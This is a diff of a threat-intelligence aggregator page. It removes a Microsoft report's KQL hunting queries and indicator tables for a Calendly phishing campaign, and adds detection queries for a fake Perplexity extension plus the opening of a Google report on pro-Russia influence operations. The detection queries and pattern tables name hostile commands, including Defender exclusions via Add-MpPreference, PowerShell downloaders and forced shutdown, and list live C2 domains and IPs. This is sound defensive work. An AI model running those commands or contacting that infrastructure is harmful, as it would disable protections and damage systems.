-DeviceProcessEvents | where FileName =~ "explorer.exe" or FileName =~ "cmd.exe" or FileName =~ "powershell.exe" | where ProcessCommandLine has ".lnk" | where ProcessCommandLine has_any ("IMG-", "PHOTO-") and ProcessCommandLine has ".png.lnk" | project Timestamp, DeviceName, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine | order by Timestamp desc |
-Node.js implant execution from user-space paths
-This query identifies Node.js execution from the campaign’s characteristic AppData\Local\Nodejs\ staging path with JavaScript payload arguments.
-DeviceProcessEvents | where FileName =~ "node.exe" | where FolderPath has @"\AppData\Local\Nodejs\" | where ProcessCommandLine has ".js" | project Timestamp, DeviceName, FolderPath, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine | order by Timestamp desc |
-.NET DLL compilation from PowerShell-downloaded scripts (Wave 2)
-This query detects the Wave 2 attack chain expansion where PowerShell scripts trigger dynamic .NET compilation through csc.exe.
-DeviceProcessEvents | where FileName in~ ("csc.exe", "cvtres.exe") | where InitiatingProcessFileName in~ ("powershell.exe", "pwsh.exe") or InitiatingProcessFolderPath has @"\AppData\Local\Temp\" | project Timestamp, DeviceName, FileName, FolderPath, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine | order by Timestamp desc |
-Defender process exclusions followed by Temp execution
-This query correlates Defender exclusion modifications with subsequent executable launches from temporary paths within a 30-minute window.
-let exclusionEvents = DeviceProcessEvents | where FileName in~ ("powershell.exe", "pwsh.exe") | where ProcessCommandLine has "Add-MpPreference" and ProcessCommandLine has "-ExclusionProcess" | project DeviceId, DeviceName, ExclusionTime=Timestamp, ExclusionCmd=ProcessCommandLine; let tempExecs = DeviceProcessEvents | where FolderPath has @"\AppData\Local\Temp\" | where FileName endswith ".exe" or ProcessCommandLine has ".exe" | project DeviceId, TempExecTime=Timestamp, TempFile=FileName, TempPath=FolderPath, TempCmd=ProcessCommandLine; exclusionEvents | join kind=inner tempExecs on DeviceId | where TempExecTime between (ExclusionTime .. ExclusionTime + 30m) | project DeviceName, ExclusionTime, ExclusionCmd, TempExecTime, TempFile, TempPath, TempCmd | order by ExclusionTime desc |
-Installer or unpacker behavior using is-.tmp and silent flags
-This query identifies the campaign’s characteristic use of temporary installer files with silent execution flags.
-DeviceProcessEvents | where ProcessCommandLine has @"\is-" and ProcessCommandLine has ".tmp" | where ProcessCommandLine has_any ("/SL5", "/VERYSILENT") | project Timestamp, DeviceName, FileName, FolderPath, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine | order by Timestamp desc |
-Registry persistence to Node.js and ProgramData
-This query detects creation or modification of Run or RunOnce values pointing to the campaign’s persistence locations.
-DeviceRegistryEvents | where RegistryKey has @"\Software\Microsoft\Windows\CurrentVersion\Run" or RegistryKey has @"\Software\Microsoft\Windows\CurrentVersion\RunOnce" | where RegistryValueData has_any (@"\AppData\Local\Nodejs\", @"\ProgramData\") | project Timestamp, DeviceName, ActionType, RegistryKey, RegistryValueName, RegistryValueData, InitiatingProcessFileName, InitiatingProcessCommandLine | order by Timestamp desc |
-Non-standard port beaconing from Node.js or suspicious user-space binaries
-This query identifies network connections on the campaign’s observed C2 ports from suspicious process locations.
-DeviceNetworkEvents | where RemotePort in (8443, 8445, 8453, 5555, 56001, 56002, 56003) | where InitiatingProcessFileName =~ "node.exe" or InitiatingProcessFolderPath has @"\AppData\Local\Temp\" or InitiatingProcessFolderPath has @"\AppData\Local\Nodejs\" or InitiatingProcessFolderPath has @"\ProgramData\" | project Timestamp, DeviceName, InitiatingProcessFileName, InitiatingProcessFolderPath, InitiatingProcessCommandLine, RemoteIP, RemotePort, RemoteUrl | order by Timestamp desc |
-Wave 2 .cfd and .bond domain connections
-This query detects network connections to the campaign’s Wave 2 domain infrastructure.
-DeviceNetworkEvents | where RemoteUrl has_any (".cfd", ".bond", ".click") | where RemoteUrl has "photo-" or RemoteUrl has_any ("zloapobikahy23", "higoksbupwou", "aluminiostramuntana") | project Timestamp, DeviceName, RemoteUrl, RemoteIP, RemotePort, InitiatingProcessFileName, InitiatingProcessCommandLine | order by Timestamp desc |
-Browser automation and forced shutdown on previously affected hosts
-This query identifies late-stage post-compromise behavior on hosts already showing earlier campaign indicators.
-let suspiciousHosts = DeviceProcessEvents | where FileName =~ "node.exe" and FolderPath has @"\AppData\Local\Nodejs\" | distinct DeviceId; DeviceProcessEvents | where DeviceId in (suspiciousHosts) | where ProcessCommandLine has_any ("--headless", "--no-sandbox", "shutdown -s -t 0") | project Timestamp, DeviceName, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine | order by Timestamp desc |
-Calendly-associated notification infrastructure used in phishing delivery
-This query identifies emails from the campaign’s Calendly-associated subdomain with the characteristic display name.
-EmailEvents | where SenderMailFromDomain =~ "em1618.calendly.com" | where SenderMailFromAddress startswith "bounces+13766497-" or SenderDisplayName has "Booking Manager" | project Timestamp, NetworkMessageId, SenderFromAddress, SenderDisplayName, RecipientEmailAddress, Subject, DeliveryAction, DeliveryLocation, ThreatTypes | order by Timestamp desc |
-share.google redirect token detection in email URLs
-This query detects emails containing share.google redirect URLs, which the campaign uses as an intermediate hop to obscure the final phishing destination.
-EmailUrlInfo | where Url contains "share.google/" | join kind=inner EmailEvents on NetworkMessageId | where SenderMailFromDomain has "calendly" or SenderDisplayName has "Booking" | project Timestamp, NetworkMessageId, SenderFromAddress, RecipientEmailAddress, Subject, Url, DeliveryAction | order by Timestamp desc |
-Calendly redirect URL phishing detection
-This query identifies emails containing Calendly redirect URLs that match known campaign patterns, including share.google tokens or photo-*.cfd domains.
-EmailUrlInfo | where Url contains "calendly.com/url?q=" | where Url has_any ("share.google", "photo-", ".cfd") | join kind=inner EmailEvents on NetworkMessageId | project Timestamp, NetworkMessageId, SenderFromAddress, SenderDisplayName, RecipientEmailAddress, Subject, Url, DeliveryAction, AuthenticationDetails | order by Timestamp desc |
-High-frequency file hash hunting (combined Waves 1 and 2)
-This query hunts for all known campaign file hashes across endpoint telemetry.
-let hashes = dynamic([ "83e970feb3f10692c164f6889f7a026f135c2433e5bf8e662a6e63a3b81267b7", "06a2888c1f07119873ccb051221bd8717281494b33585f4242556e6e5e227969", "04ec44f2618460f5c77c5e56014a512cc03a123c9c5b6b6b1273e2a1681ac2e1", "1c693bcdaf1da636eb21c274b21cc2f6c52c62ddd514700783eee83fe13acb0a", "2e5fd01b7949a45937b853eabcf4b03195614cf84338dcaaa97240d1c5301ddc", "3f66634f103b80412d1d670b91befab2a74425d2ea76d904c4a7ffae2ae94b44", "63565f15a99769bbcd527a4d53e5cc259d80e1254463ef9c878c2074685558ae", "49cc0e0c3ec060fb354cacee244d4f297aaefb6db66e67a21262d6c4d2eae1bd", "6580de3b74fd635a1d7a887b8f6e5b0c9ac9e90d6e20466ad41489203119cca9", "f629311734b7c6e6579f8e1d0e1e3f3bf72c9ac6c301b631ba4df7f393c41b14", "98825c0c7764f45c891275b2f038ea559e84b340df30b41c2cc77b8d4215c6c8", "bd6805782df15e53581096b99bd6bbb81f4d4a5e2d2b30954df63175a4075be9", "89934cb1494cf0327f0ab82fe644c74caf687814379cad116bd7adaca74c1028", "1f8daffec5945a13a1e9231f4a76655d4c7ef4560d0c64ca3abfe48f38297cbd", "9f10e3b6e5745784f26d18c38ce01fba054b19749c17260978ac11472564aee2", "97448688b292bfec6d83b153588076fe59b111c35ac4e42a916238df16a71e2f", "c5baa0c16b0074a1e94b48aa0177e9bfc23746aca8a5b42848a6685da85658b5", "b7f46b192cd83a1d2487cb048cca645f6e8855b9673d500d50bbdb04eebc6bea" ]); DeviceFileEvents | where SHA256 in (hashes) | project Timestamp, DeviceName, ActionType, FileName, FolderPath, SHA256, InitiatingProcessFileName, InitiatingProcessCommandLine | order by Timestamp desc |
-Microsoft Sentinel
-Microsoft Sentinel customers can use the Microsoft Defender XDR connector to ingest the above queries or leverage the Threat Intelligence Mapping analytics rule to match campaign IOCs against ingested logs.
-MITRE ATT&CK techniques
-| Tactic | Technique ID | Technique Name | Observed Activity |
-| Resource Development | T1583.001 | Acquire Infrastructure: Domains | Short-lived .cfd landing domains (photo-26653[.]cfd, photo-26656[.]cfd, photo-27857[.]cfd) are registered and rotated every 2–3 days |
-| T1583.006 | Acquire Infrastructure: Web Services | Use of Calendly account (em1618.calendly[.]com) and generated share[.]google redirect tokens to relay phishing | |
-| T1584.006 | Compromise Infrastructure: Web Services | Suspected use of a compromised legitimate domain (ginrinsou[.]com) as an alternate sending relay | |
-| Initial Access | T1566.002 | Phishing: Spearphishing Link | Calendly notification emails carrying redirect links (observed from late May 2026) |
-| T1199 | Trusted Relationship | Authentication laundering through Calendly’s SendGrid infrastructure | |
-| Execution | T1204.002 | User Execution: Malicious File | User opens fake image LNK (IMG-/PHOTO-*.png.lnk) |
-| T1059.001 | PowerShell | Obfuscated bigint decoder downloads .ps1 | |
-| T1059.007 | JavaScript | Node.js implant executes .js payload with C2 domain | |
-| Defense Evasion | T1027 | Obfuscated Files or Information | Seven-phase PowerShell obfuscation evolution |
-| T1027.004 | Compile After Delivery | csc.exe compiles .NET DLL on-target (Wave 2) | |
-| T1036 | Masquerading | LNK files disguised as .png images | |
-| T1562.001 | Disable or Modify Tools | Add-MpPreference exclusions for Temp EXE files | |
-| Persistence | T1547.001 | Registry Run Keys / Startup Folder | Dual Run (Node.js) + RunOnce (ProgramData EXE) |
-| Discovery | T1016 | System Network Configuration Discovery | ip-api[.]com geolocation lookup |
-| Command & Control | T1571 | Non-Standard Port | C2 on ports 8443, 8445, 8453, 5555, 56001-56003 |
+Look for the presence of the malicious extension through file artifacts:
+DeviceFileEvents | where FileName has "flkebkiofojicogddingbdmcmkpbplcd" or FolderPath has "flkebkiofojicogddingbdmcmkpbplcd" | summarize Count = count() by DeviceName, DeviceId, FolderPath |
+Look for outbound network communication to intermediary infrastructure not associated with the official vendor domain:
+DeviceNetworkEvents | where RemoteUrl has "perplexity-ai.online" | summarize Count = count() by DeviceName, DeviceId, InitiatingProcessAccountName, RemoteUrl |
+MITRE ATT&CK techniques observed
+| Tactic | Observed activity |
+| Initial Access | User installs malicious Chromium extension using branding and naming similar to the Perplexity AI service from browser ecosystem |
+| Execution | Extension executes MV3 logic and DNR rules to intercept and control traffic |
+| Persistence | Extension forces itself as default search provider using chrome_settings_overrides (is_default=true) |
+| Defense Evasion | Uses legitimate MV3 APIs (DNR rules) to hide malicious behavior inside browser-native logic |
+| Input Capture | Real-time search suggestions (keystrokes) are captured through suggest_url and routed to attacker domain |
+| Command and Control | Browser queries are routed to an intermediary infrastructure not associated with the official vendor domain acting as intermediary |
 Indicators of compromise
-Observed C2 IPs and non-standard ports
 | Indicator | Type | Description |
-| 178.16.54[.]27 | IP | Primary — Active in both waves, ports 56001/56002 |
-| 95.217.97[.]121 | IP | Persistent beacon (Wave 1) |
-| 193.202.84[.]32 | IP | Secondary (Wave 1) |
-| 178.16.55[.]179 | IP | Additional (Wave 1) |
-| 172.67.161[.]215 | IP | phishing TonRAT C2 (Cloudflare shared CDN ) |
-| 8443, 8445, 8453 | Port | Non-standard C2 ports |
-| 5555 | Port | Non-standard C2 port |
-| 56001, 56002, 56003 | Port | Non-standard C2 ports |
-Representative observed domains
-Wave 1 domains
-| Indicator | Type | Description |
-| prejointl[.]info | Domain | C2 domain |
-| safedocphoto[.]info | Domain | C2 domain |
-| recallnine[.]info | Domain | C2 domain |
-| kentjerk[.]info | Domain | C2 domain |
-| photodoc-secure[.]info | Domain | C2 domain |
-| kelopins[.]info | Domain | C2 domain |
-| docstore-safe[.]info | Domain | C2 domain |
-| photosafe-hub[.]info | Domain | C2 domain |
-| dashgamein[.]info | Domain | C2 domain |
-| image-vlt[.]info | Domain | C2 domain |
-| safedoc-storage[.]info | Domain | C2 domain |
-| safe-picvault[.]info | Domain | C2 domain |
-| photo-dekor[.]xyz | Domain | C2 domain |
-| reservebookphot[.]pro | Domain | C2 domain |
-| kellystreets[.]info | Domain | C2 domain |
-| widjssij728dj[.]com | Domain | C2 domain |
-| docshub-01[.]info | Domain | C2 domain |
-| photobookadm[.]pro | Domain | C2 domain |
-| safedoc-vault[.]info | Domain | C2 domain |
-| keypmenu[.]info | Domain | C2 domain |
-| photo-box[.]info | Domain | C2 domain |
-| expedla-getphoto[.]cloud | Domain | C2 domain |
-| vertualstreak[.]info | Domain | C2 domain |
-| montagelips[.]info | Domain | C2 domain |
-| racestrech[.]info | Domain | C2 domain |
-| derbyoni[.]info | Domain | C2 domain |
-| ministrew[.]info | Domain | C2 domain |
-| visaphoto-secure[.]info | Domain | C2 domain |
-| docshub-secure[.]com | Domain | C2 domain |
-| visaimage-storage[.]icu | Domain | C2 domain |
-| lookinlip[.]info | Domain | C2 domain |
-| safephoto-vault[.]info | Domain | C2 domain |
-| kiptownim[.]info | Domain | C2 domain |
-| finallyrain[.]info | Domain | C2 domain |
-| photobook-reserv[.]pro | Domain | C2 domain |
-| bookreservphoto[.]pro | Domain | C2 domain |
-| imagestore-hub[.]info | Domain | C2 domain |
-| visaimages[.]info | Domain | C2 domain |
-| visaphoto-vault[.]info | Domain | C2 domain |
-| visa-vault[.]info | Domain | C2 domain |
-| visa-safedocs[.]info | Domain | C2 domain |
-| joincroud[.]info | Domain | C2 domain |
-| kinghoruswe[.]info | Domain | C2 domain |
-| snapkeep[.]info | Domain | C2 domain |
-| deeprace[.]info | Domain | C2 domain |
-| lestresot[.]info | Domain | C2 domain |
-| recepyman[.]info | Domain | C2 domain |
-| recstrace[.]info | Domain | C2 domain |
-| heliosup[.]info | Domain | C2 domain |
-| fairyspells[.]info | Domain | C2 domain |
-| hakeiwjs727wj[.]com | Domain | C2 domain |
-| haobbao[.]com | Domain | C2 domain |
-| dancamp[.]info | Domain | C2 domain |
-| sec-safe-dc[.]info | Domain | C2 domain — Active in both waves |
-| secure-imagehub[.]info | Domain | C2 domain |
-| doc-imagehub[.]info | Domain | C2 domain |
-| imagevault-safe[.]info | Domain | C2 domain |
-| photo-hub-io[.]info | Domain | C2 domain |
-| safevault-hub[.]info | Domain | C2 domain |
-| tripadvisor-photo-view[.]com | Domain | C2 domain |
-| photo-7216302[.]sbs | Domain | C2 domain |
-Wave 2 domains
-| Indicator | Type | Description |
-| photo-26254[.]cfd | Domain | Phishing landing page |
-| photo-132454[.]cfd | Domain | Phishing landing page |
-| photo-8632454[.]cfd | Domain | Phishing landing page |
-| photo-21473[.]xyz | Domain | C2 domain |
-| photo-7216102[.]click | Domain | C2 domain |
-| zloapobikahy23[.]bond | Domain | C2 domain |
-| higoksbupwou[.]com | Domain | C2 domain |
-| aluminiostramuntana[.]com | Domain | C2 domain |
-| photo-26653[.]cfd | Domain | Phishing landing page |
-| photo-26654[.]cfd | Domain | Phishing landing page |
-| photo-26656[.]cfd | Domain | Phishing landing page |
-| photo-27857[.]cfd | Domain | Phishing landing page |
-Microsoft has assigned malicious ratings to these domains, and they are being blocked.
-File hashes
-| Indicator | Type | Description |
-| 83e970feb3f10692c164f6889f7a026f135c2433e5bf8e662a6e63a3b81267b7 | SHA-256 | Campaign payload (Wave 1) |
-| 06a2888c1f07119873ccb051221bd8717281494b33585f4242556e6e5e227969 | SHA-256 | Campaign payload (Wave 1) |
-| 04ec44f2618460f5c77c5e56014a512cc03a123c9c5b6b6b1273e2a1681ac2e1 | SHA-256 | PE payload (xmnrwv9l.exe) — Same hash in both waves |
-| 1c693bcdaf1da636eb21c274b21cc2f6c52c62ddd514700783eee83fe13acb0a | SHA-256 | Campaign payload (Wave 1) |
-| 2e5fd01b7949a45937b853eabcf4b03195614cf84338dcaaa97240d1c5301ddc | SHA-256 | Campaign payload (Wave 1) |
-| 3f66634f103b80412d1d670b91befab2a74425d2ea76d904c4a7ffae2ae94b44 | SHA-256 | Campaign payload (Wave 1) |
-| 63565f15a99769bbcd527a4d53e5cc259d80e1254463ef9c878c2074685558ae | SHA-256 | Campaign payload (Wave 1) |
-| 49cc0e0c3ec060fb354cacee244d4f297aaefb6db66e67a21262d6c4d2eae1bd | SHA-256 | Campaign payload (Wave 1) |
-| 6580de3b74fd635a1d7a887b8f6e5b0c9ac9e90d6e20466ad41489203119cca9 | SHA-256 | Campaign payload (Wave 1) |
-| da4b72764ae929050353f3da759c839e2a061a8b9a8dd3c3b2e909d4a8a3291c | SHA-256 | Campaign payload (Wave 1) |
-| f629311734b7c6e6579f8e1d0e1e3f3bf72c9ac6c301b631ba4df7f393c41b14 | SHA-256 | Campaign payload (Wave 1) |
-| 98825c0c7764f45c891275b2f038ea559e84b340df30b41c2cc77b8d4215c6c8 | SHA-256 | Campaign payload (Wave 1) |
-| bd6805782df15e53581096b99bd6bbb81f4d4a5e2d2b30954df63175a4075be9 | SHA-256 | Campaign payload (Wave 1) |
-| 89934cb1494cf0327f0ab82fe644c74caf687814379cad116bd7adaca74c1028 | SHA-256 | Campaign payload (Wave 1) |
-| 1f8daffec5945a13a1e9231f4a76655d4c7ef4560d0c64ca3abfe48f38297cbd | SHA-256 | Campaign payload (Wave 1) |
-| 9f10e3b6e5745784f26d18c38ce01fba054b19749c17260978ac11472564aee2 | SHA-256 | IMG-386443483.png.lnk (Wave 2) |
-| 97448688b292bfec6d83b153588076fe59b111c35ac4e42a916238df16a71e2f | SHA-256 | PHOTO-215746435.png.lnk (Wave 2) |
-| c5baa0c16b0074a1e94b48aa0177e9bfc23746aca8a5b42848a6685da85658b5 | SHA-256 | qFWe908J.ps1 (419 KB, Wave 2) |
-| b7f46b192cd83a1d2487cb048cca645f6e8855b9673d500d50bbdb04eebc6bea | SHA-256 | bjygtujc.dll (3,072 bytes, compiled .NET, Wave 2) |
-| d14ba95cdce1ef7dc9ad3ac74949ca5db38b27378ee30f30a23cf26f9e875a11 | SHA-256 | node.exe (v24.13.0-win-x64, 89.9 MB) |
-Key behavioral patterns
-| Indicator | Type | Description |
-| Pattern A | Behavior | Obfuscated PowerShell downloader: BigInt decoder → iwr → .ps1 |
-| Pattern B | Behavior | .NET DLL compilation: csc.exe → cvtres.exe → <random>.dll (Wave 2) |
-| Pattern C | Behavior | Node.js implant: node.exe <random>.js <domain> |
-| Pattern D | Behavior | Defender exclusion: Add-MpPreference -ExclusionProcess |
-| Pattern E | Behavior | Temp EXE execution: Numerous random filenames |
-| Pattern F | Behavior | Installer or unpacker: *.tmp with /SL5 or /VERYSILENT |
-| Pattern G | Behavior | ProgramData copy: Lowercase, same hash |
-| Pattern H | Behavior | RunOnce loop persistence: Value refreshed after each execution |
-| Pattern I | Behavior | Browser automation: –headless –no-sandbox |
-| Pattern J | Behavior | Forced shutdown: cmd /c shutdown -s -t 0 |
-| Pattern K | Behavior | Persistence survival: Node.js Run key survives Defender PE block |
-| Pattern L | Behavior | Authentication laundering: Direct-path Calendly email passes SPF/DKIM/DMARC/CompAuth (share.google variant fails authentication) |
-| Pattern M | Behavior | Multi-hop redirect: Calendly → share.google → Google → photo-*.cfd |
-| Pattern N | Behavior | Domain rotation: photo-*.cfd domains with ~2–3 day lifespan |
+| perplexity-ai[.]online | Domain | Typosquatted domain used for search redirection |
+| flkebkiofojicogddingbdmcmkpbplcd | Extension ID | Malicious Chromium extension |
+| extension.tilda[.]ws/perplexityai | URL | Installation onboarding page |
 References
-[Technical Analysis of Suspicious Emails Targeting the Hotel Industry | SOC Prime](https://socprime.com/active-threats/technical-analysis-of-suspicious-emails-targeting-the-hotel-industry/)[ITOCHU Cyber & Intelligence](https://blog.itochuci.co.jp/entry/2026/06/11/110000)
-This research is provided by Microsoft Defender Security Research, Parth Jamodkar, and with contributions from members of Microsoft Threat Intelligence.
+[Phishing Via Typosquatting and Brand Impersonation: Trends and Tactics](https://www.zscaler.com/blogs/security-research/phishing-typosquatting-and-brand-impersonation-trends-and-tactics)– Zscaler[Overriding Chrome Settings](https://developer.chrome.com/docs/extensions/reference/manifest/chrome-settings-override)
+This research is provided by Microsoft Defender Security Research, Asutosha Panigrahi, Ashwani Kumar, Mohd Sadique, and with contributions from members of Microsoft Threat Intelligence.
 Learn more
 For the latest security research from the Microsoft Threat Intelligence community, check out the [Microsoft Threat Intelligence Blog](https://aka.ms/threatintelblog).
 To get notified about new publications and to join discussions on social media, follow us on [LinkedIn](https://www.linkedin.com/showcase/microsoft-threat-intelligence), [X (formerly Twitter)](https://x.com/MsftSecIntel), and [Bluesky](https://bsky.app/profile/threatintel.microsoft.com).
 To hear stories and insights from the Microsoft Threat Intelligence community about the ever-evolving threat landscape, listen to the [Microsoft Threat Intelligence podcast](https://thecyberwire.com/podcasts/microsoft-threat-intelligence).
 Review our documentation to learn more about our real-time protection capabilities and see how to enable them within your organization.
-- Explore
-[how to build and customize agents with Copilot Studio Agent Builder](https://eurppc-word-edit.officeapps.live.com/we/%E2%80%A2%09https:/learn.microsoft.com/en-us/microsoft-365-copilot/extensibility/copilot-studio-agent-builder) [Microsoft 365 Copilot AI security documentation](https://learn.microsoft.com/en-us/copilot/microsoft-365/microsoft-365-copilot-ai-security)[How Microsoft discovers and mitigates evolving attacks against AI guardrails](https://www.microsoft.com/en-us/security/blog/2024/04/11/how-microsoft-discovers-and-mitigates-evolving-attacks-against-ai-guardrails/)- Learn more about
+[Microsoft 365 Copilot AI security documentation](https://learn.microsoft.com/en-us/copilot/microsoft-365/microsoft-365-copilot-ai-security)[How Microsoft discovers and mitigates evolving attacks against AI guardrails](https://www.microsoft.com/en-us/security/blog/2024/04/11/how-microsoft-discovers-and-mitigates-evolving-attacks-against-ai-guardrails/)- Learn more about
 [securing Copilot Studio agents with Microsoft Defender](https://learn.microsoft.com/en-us/defender-cloud-apps/ai-agent-protection) - Evaluate your AI readiness with our latest
 [Zero Trust for AI workshop](https://microsoft.github.io/zerotrustassessment/). - Learn more about
 [Protect your agents in real-time during runtime (Preview)](https://learn.microsoft.com/en-us/defender-cloud-apps/real-time-agent-protection-during-runtime)</div>
@@ -601,7 +267,132 @@ Review our documentation to learn more about our real-time protection capabiliti
             <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
             <hr class="separator">
         </div>
+        <div id="art-5" class="article-body">
+            <h2 class="article-title">The Bear Necessities: A Look at the Drivers, Dynamics, and Applications of the Pro-Russia Influence Ecosystem</h2>
+            <p class="source-link">Source: Threat Intelligence | <a href="https://cloud.google.com/blog/topics/threat-intelligence/pro-russia-influence-ecosystem/" target="_blank">Original Link</a></p>
+            <div class="content-text">The Bear Necessities: A Look at the Drivers, Dynamics, and Applications of the Pro-Russia Influence Ecosystem
+Google Threat Intelligence Group
+Google Threat Intelligence
+Visibility and context on the threats that matter most.
+[Contact Us & Get a Demo](https://cloud.google.com/security/resources/google-threat-intelligence-demo?utm_source=cgc-blog&utm_medium=blog&utm_campaign=FY25-Q2-global-GCP30649-website-su-dgcsm-GTI-interest)
+Written by: James Sadowski, Alden Wahlstrom
+Introduction
+Four years into Russia’s full-scale invasion of Ukraine, the pro-Russia influence ecosystem has evolved from a tool of war back into a global strategic asset. Since the mobilization of this ecosystem to support frontline objectives, we have witnessed the expedited development of new influence assets linked to multiple, expansive, covert information operations (IO) campaigns and a [revitalization](https://cloud.google.com/blog/topics/threat-intelligence/global-revival-of-hacktivism) of pro-Russia hacktivism at an unprecedented scale. While this threat activity initially adapted to encompass Ukraine-related priorities, it is gradually pivoting back to established Russian influence objectives for which the ecosystem was originally honed. This shift is significant because it likely signals increased focus outside of Ukraine, warning that pro-Russia influence activity targeting the European Union (EU), North Atlantic Treaty Organization (NATO), and other top targeting priorities may intensify.
+Ultimately, the war in Ukraine has provided a critical feedback loop for Russia to refine its influence activity, lessons that we anticipate will be applied as the ecosystem continues to reorient toward global strategic objectives while maintaining focus on Ukraine. Further, recent pro-Russia IO indicates the continued expansion of already diverse tactics, and the increasing use of [generative AI tooling](https://cloud.google.com/blog/topics/threat-intelligence/adversarial-misuse-generative-ai) for planning, research, and content creation marks a forward trend in pro-Russia IO. Meanwhile, new and different actors have adopted IO tactics to meet an increasingly diverse set of challenges, signaling growing Russian reliance on influence tactics. Together, these trends likely demonstrate the Kremlin's perception of these tactics as cost effective and successful. The interconnected nature of the ecosystem's disparate components makes it resilient to limited scope disruptions, which defenders must consider to effectively mitigate pro-Russia influence threats.
+The Ecosystem at a Glance: Objectives, Targeting, and Tactics
+Russia's modern approach to information operations is built on the conceptual foundation of Soviet-era "[active measures](https://www.marshallcenter.org/en/publications/security-insights/active-measures-russias-covert-geopolitical-operations-0)" adapted for the digital age. Alongside disruptive cyberattacks dating back to the early 2000s, the Kremlin has increasingly harnessed internet-based platforms for espionage and information operations. Russia's approach has evolved from rudimentary, singular operations into a complex, self-sustaining environment intentionally curated by the Russian Government that blends overt, covert, and independent elements to advance Kremlin interests both at home and abroad.
+Core Influence Objectives
+GTIG’s observations suggest the primary strategic motivations driving the pro-Russia influence ecosystem fall into five categories, each aiming to achieve military and/or political objectives through psychological manipulation of the target audience (Figure 1). Collectively, these objectives informally depict a global influence strategy: through the furthest reach of its influence, the Kremlin seeks to diminish Western primacy and advance Russia's global position; within its surrounding region, it strives to retain and return Moscow's dominance; and at home, it works to ensure the stability of the political regime.
+Figure 1: Core objectives of the pro-Russia influence ecosystem
+Targeting
+Pro-Russia influence operations are pivoting from the [near singular focus on Ukraine](https://cloud.google.com/blog/topics/threat-intelligence/information-operations-surrounding-ukraine) that dominated the ecosystem since 2022. We expect influence operations advancing Russia's war-specific interests to continue. However, as Russia seeks to reemerge from international isolation, we have increasingly observed a concurrent focus on pre-war pro-Russia influence objectives.
+The current and historical targeting scope of each ecosystem component exposes both the Kremlin's global ambitions and the realistic limitations of its power projection. State-owned media organizations produce content intended to serve populations across six continents, but in recent years, sanctions and other factors have limited its production and distribution. Meanwhile, covert operations have appeared more limited in scope, primarily targeting the West and countries surrounding Russia, with intermittent operations targeting the Middle East and Africa, indicating that finite resources necessarily limit these operations (Figure 2).
+Top Regional Targets
+-
+The United States and Europe: The Kremlin has long viewed the West as a top adversary of Russia. Accordingly, the US and Europe are top targets of covert pro-Russia information operations, especially aimed at undermining political stability within these countries and the unity between them. NATO and the EU embody the collective "West" and are Russia's perceived top adversaries, second only to the US independently.
+-
+Russia's "Near Abroad": Since the dissolution of the Soviet Union, Moscow has asserted that the countries that formerly comprised part of the USSR now reside in Russia's so-called "sphere of influence." Covert influence targeting this region directly reflects Moscow's assertion that Russia is a world power entitled to special privileges within its neighborhood.
+-
+The Middle East and Africa: Over the past decade, Russian efforts to reassert itself as a global power have included high-profile investments in cultivating Russia's standing in the Middle East and
+[Africa](https://cloud.google.com/blog/topics/threat-intelligence/io-campaigns-russian-prigozhin-persist). Covert pro-Russia influence activity is likely deployed in tandem as intended support for other Russian initiatives in these regions. -
+Russia Domestic: Internally targeted covert IO is a well-established component of pro-Russia influence activity, deployed by regime-aligned actors to promote Kremlin policies and repress opposition voices.
+Targeted Entities and Global Events
+-
+The Olympics: Russia has long viewed Olympic participation as a point of national prestige, and GTIG has observed notable Russian influence activity targeting the
+[Olympics](https://cloud.google.com/blog/topics/threat-intelligence/cyber-threats-2024-paris-olympics)in the face of Russian participation bans. -
+War in Ukraine: The
+[war in Ukraine](https://cloud.google.com/blog/topics/threat-intelligence/information-operations-surrounding-ukraine)has been a key driver of Russia's influence activity, including attempts to influence events on the ground as well as influence activity intended to advance Moscow's interests elsewhere vis-a-vis the war. GTIG expects that Ukraine will remain a priority in Russia's targeting calculus during the post-conflict phase following any future peace agreements. -
+Elections: Election targeting aligns with multiple Russian influence objectives, including attempting to undermine confidence in democratic institutions as well as internally weakening perceived Western adversaries. These operations regularly target elections in countries that are already prioritized by ongoing pro-Russia influence activity.
+-
+Ad Hoc Geopolitical Flashpoints and Global Events: Russian influence actors have a history of pivoting activity to engage with emerging geopolitical developments and events, such as the
+[COVID-19](https://cloud.google.com/blog/topics/threat-intelligence/limited-shifts-cyber-threat-landscape-driven-covid-19?e=48754805)pandemic or the[2026 Middle East](https://apnews.com/article/iran-war-images-misinformation-russia-israel-9e495017dc5c4bf24a0b6152863dbfb1)conflict. This flexible target selection often overlaps or is aligned with other Russian priorities, making previously observed Russian influence activity helpful in anticipating which events may be appropriated.
+Figure 2: Priority targets of the ecosystem
+Tactics
+Converging geopolitical and technological developments make the evolution of pro-Russia influence tactics a particularly important space to monitor right now. The pro-Russia influence ecosystem expanded to support the war effort, bringing change across the spectrum of activity and providing operators the opportunity to hone their tactics, techniques, and procedures (TTPs) in the rapid feedback loop of war. Meanwhile, the emergence and increased democratization of [generative AI](https://cloud.google.com/blog/topics/threat-intelligence/distillation-experimentation-integration-ai-adversarial-use) tooling has brought both promised and already realized opportunities to support all phases of the IO lifecycle. The following are a sample of key tactics that illustrate how pro-Russia actors currently blend well-tested methods with new technological developments to reach audiences through diverse means:
+-
+Generative AI: GTIG
+[has observed](https://cloud.google.com/blog/topics/threat-intelligence/adversarial-misuse-generative-ai)pro-Russia influence actors increasingly leverage AI tooling to support different stages of their operations, including support for planning and general research as well as content creation. -
+Google Threat Intelligence Group (GTIG) is closely tracking the transition from nascent AI-enabled operations to the maturing, industrial-scale application of generative models within adversarial workflows across threats ranging from espionage and crime to IO. Please see our latest
+[AI threat tracker](https://cloud.google.com/blog/topics/threat-intelligence/ai-vulnerability-exploitation-initial-access)for more information on how this threat is developing based on our insights, and what Google is doing to protect our customers. -
+Narrative Resonance: Hijacking existing ideological and emotional fissures within a society provides pro-Russia influence actors tailored narratives to target audiences and potentially increases potential engagement and impact.
+-
+Cyber-Enabled IO: Influence campaigns frequently coincide with destructive cyberattacks, such as the deployment of
